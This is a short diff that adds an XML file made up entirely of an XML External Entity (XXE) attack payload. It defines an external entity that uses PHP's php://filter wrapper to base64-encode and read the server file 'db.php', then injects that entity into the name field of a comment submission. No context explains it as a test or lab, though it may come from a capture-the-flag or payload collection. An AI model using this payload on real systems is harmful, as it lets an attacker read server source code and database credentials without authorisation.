@@ -1,0 +1,5 @@
+<!DOCTYPE replace [<!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=db.php"> ]>
+<comments>
+    <name>&xxe;</name>
+    <comment>mypass</comment>
+</comments>
